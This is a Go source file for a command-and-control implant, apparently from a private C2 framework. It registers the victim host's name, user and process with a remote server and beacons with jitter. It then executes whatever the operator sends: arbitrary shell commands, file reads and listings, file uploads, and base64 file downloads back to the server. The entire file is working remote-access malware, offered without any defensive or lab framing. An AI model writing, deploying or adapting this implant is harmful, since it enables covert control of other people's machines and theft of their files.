package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/azizbinmohammad/private-c2/pkg/envelope"
)

// Wire protocol message types.
type Message struct {
	Type string          `json:"type"`
	Data json.RawMessage `json:"data"`
}

type RegisterData struct {
	ImplantID string `json:"implant_id"`
	Hostname  string `json:"hostname"`
	Username  string `json:"username"`
	OS        string `json:"os"`
	Arch      string `json:"arch"`
	PID       int    `json:"pid"`
	Process   string `json:"process"`
	Mode      string `json:"mode"`
}

type RegisterAckData struct {
	SessionID string `json:"session_id"`
	Interval  int    `json:"interval"`
}

type CheckinData struct {
	SessionID string `json:"session_id"`
}

type Task struct {
	ID   string `json:"id"`
	Type string `json:"type"`
	Args string `json:"args"`
}

type TaskingData struct {
	Tasks []Task `json:"tasks"`
}

type ResultData struct {
	SessionID string `json:"session_id"`
	TaskID    string `json:"task_id"`
	Success   bool   `json:"success"`
	Output    string `json:"output"`
	Error     string `json:"error"`
}

func sendMessage(conn net.Conn, msg *Message) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal message: %w", err)
	}
	return envelope.WriteFrame(conn, data)
}

func readMessage(conn net.Conn) (*Message, error) {
	data, err := envelope.ReadFrame(conn)
	if err != nil {
		return nil, err
	}
	var msg Message
	if err := json.Unmarshal(data, &msg); err != nil {
		return nil, fmt.Errorf("unmarshal message: %w", err)
	}
	return &msg, nil
}

func generateImplantID() string {
	const charset = "abcdef0123456789"
	b := make([]byte, 16)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func buildTLSConfig(caPath string) (*tls.Config, error) {
	cfg := &tls.Config{
		MinVersion: tls.VersionTLS13,
	}

	if caPath != "" {
		caPEM, err := os.ReadFile(caPath)
		if err != nil {
			return nil, fmt.Errorf("read CA cert: %w", err)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(caPEM) {
			return nil, fmt.Errorf("failed to parse CA cert")
		}
		cfg.RootCAs = pool
	} else {
		cfg.InsecureSkipVerify = true
	}

	return cfg, nil
}

func collectSystemInfo() RegisterData {
	hostname, _ := os.Hostname()
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	return RegisterData{
		ImplantID: generateImplantID(),
		Hostname:  hostname,
		Username:  username,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		PID:       os.Getpid(),
		Process:   filepath.Base(os.Args[0]),
		Mode:      "beacon",
	}
}

func sleepWithJitter(interval time.Duration, jitter float64) {
	if jitter <= 0 {
		time.Sleep(interval)
		return
	}
	delta := time.Duration(float64(interval) * jitter)
	actual := interval - delta + time.Duration(rand.Int63n(int64(2*delta)+1))
	if actual < 0 {
		actual = 0
	}
	time.Sleep(actual)
}

func executeShell(ctx context.Context, cmdStr string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/c", cmdStr)
	} else {
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", cmdStr)
	}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func handleTask(ctx context.Context, task Task) (string, error) {
	switch task.Type {
	case "shell":
		return executeShell(ctx, task.Args)

	case "ls":
		dir := task.Args
		if dir == "" {
			dir = "."
		}
		entries, err := os.ReadDir(dir)
		if err != nil {
			return "", err
		}
		var sb strings.Builder
		for _, e := range entries {
			info, infoErr := e.Info()
			if infoErr != nil {
				sb.WriteString(fmt.Sprintf("%s\n", e.Name()))
				continue
			}
			sb.WriteString(fmt.Sprintf("%s\t%d\t%s\n", info.Mode(), info.Size(), e.Name()))
		}
		return sb.String(), nil

	case "pwd":
		return os.Getwd()

	case "cd":
		if err := os.Chdir(task.Args); err != nil {
			return "", err
		}
		return task.Args, nil

	case "ps":
		return executeShell(ctx, "ps aux")

	case "cat":
		data, err := os.ReadFile(task.Args)
		if err != nil {
			return "", err
		}
		return string(data), nil

	case "upload":
		// Args format: "base64data|/path/to/file"
		parts := strings.SplitN(task.Args, "|", 2)
		if len(parts) != 2 {
			return "", fmt.Errorf("upload args must be 'base64data|filepath'")
		}
		decoded, err := base64.StdEncoding.DecodeString(parts[0])
		if err != nil {
			return "", fmt.Errorf("decode base64: %w", err)
		}
		if err := os.WriteFile(parts[1], decoded, 0644); err != nil {
			return "", err
		}
		return fmt.Sprintf("wrote %d bytes to %s", len(decoded), parts[1]), nil

	case "download":
		data, err := os.ReadFile(task.Args)
		if err != nil {
			return "", err
		}
		return base64.StdEncoding.EncodeToString(data), nil

	default:
		return "", fmt.Errorf("unknown task type: %s", task.Type)
	}
}

func connect(serverAddr string, tlsConfig *tls.Config) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := tls.DialWithDialer(dialer, "tcp", serverAddr, tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("tls dial: %w", err)
	}
	return conn, nil
}

func register(conn net.Conn, info RegisterData) (string, error) {
	regData, err := json.Marshal(info)
	if err != nil {
		return "", err
	}
	msg := &Message{Type: "register", Data: regData}
	if err := sendMessage(conn, msg); err != nil {
		return "", fmt.Errorf("send register: %w", err)
	}

	ack, err := readMessage(conn)
	if err != nil {
		return "", fmt.Errorf("read register_ack: %w", err)
	}
	if ack.Type != "register_ack" {
		return "", fmt.Errorf("expected register_ack, got %s", ack.Type)
	}

	var ackData RegisterAckData
	if err := json.Unmarshal(ack.Data, &ackData); err != nil {
		return "", fmt.Errorf("unmarshal register_ack: %w", err)
	}

	return ackData.SessionID, nil
}

func main() {
	serverAddr := flag.String("server", "", "C2 server address (host:port)")
	interval := flag.Duration("interval", 5*time.Second, "beacon interval")
	jitter := flag.Float64("jitter", 0.3, "jitter factor (0-1)")
	caPath := flag.String("ca", "", "path to CA cert PEM (optional, skips verification if empty)")
	flag.Parse()

	if *serverAddr == "" {
		fmt.Fprintf(os.Stderr, "error: --server is required\n")
		os.Exit(1)
	}

	tlsConfig, err := buildTLSConfig(*caPath)
	if err != nil {
		log.Fatalf("tls config: %v", err)
	}

	sysInfo := collectSystemInfo()

	// Signal handling for graceful shutdown.
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	backoff := time.Second
	const maxBackoff = 60 * time.Second

	for {
		if ctx.Err() != nil {
			return
		}

		conn, err := connect(*serverAddr, tlsConfig)
		if err != nil {
			log.Printf("connect failed: %v (retry in %v)", err, backoff)
			select {
			case <-time.After(backoff):
			case <-ctx.Done():
				return
			}
			backoff *= 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			continue
		}
		backoff = time.Second // reset on successful connect

		sessionID, err := register(conn, sysInfo)
		if err != nil {
			log.Printf("register failed: %v", err)
			conn.Close()
			continue
		}

		log.Printf("registered, session_id=%s", sessionID)

		err = beaconLoop(ctx, conn, sessionID, *interval, *jitter)
		conn.Close()

		if ctx.Err() != nil {
			return
		}
		if err != nil {
			log.Printf("beacon loop error: %v (reconnecting in %v)", err, backoff)
			select {
			case <-time.After(backoff):
			case <-ctx.Done():
				return
			}
			backoff *= 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
		}
	}
}

func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval time.Duration, jitter float64) error {
	for {
		sleepWithJitter(interval, jitter)

		if ctx.Err() != nil {
			return nil
		}

		// Send checkin.
		checkinData, _ := json.Marshal(CheckinData{SessionID: sessionID})
		if err := sendMessage(conn, &Message{Type: "checkin", Data: checkinData}); err != nil {
			return fmt.Errorf("send checkin: %w", err)
		}

		// Read tasking.
		taskingMsg, err := readMessage(conn)
		if err != nil {
			if err == io.EOF {
				return fmt.Errorf("server closed connection")
			}
			return fmt.Errorf("read tasking: %w", err)
		}
		if taskingMsg.Type != "tasking" {
			log.Printf("unexpected message type: %s", taskingMsg.Type)
			continue
		}

		var tasking TaskingData
		if err := json.Unmarshal(taskingMsg.Data, &tasking); err != nil {
			log.Printf("unmarshal tasking: %v", err)
			continue
		}

		// Execute tasks.
		for _, task := range tasking.Tasks {
			output, taskErr := handleTask(ctx, task)

			result := ResultData{
				SessionID: sessionID,
				TaskID:    task.ID,
				Success:   taskErr == nil,
				Output:    output,
			}
			if taskErr != nil {
				result.Error = taskErr.Error()
				// Still include any partial output.
			}

			resultJSON, _ := json.Marshal(result)
			if err := sendMessage(conn, &Message{Type: "result", Data: resultJSON}); err != nil {
				return fmt.Errorf("send result: %w", err)
			}

			// Read result_ack.
			ack, err := readMessage(conn)
			if err != nil {
				return fmt.Errorf("read result_ack: %w", err)
			}
			if ack.Type != "result_ack" {
				log.Printf("expected result_ack, got %s", ack.Type)
			}
		}
	}
}
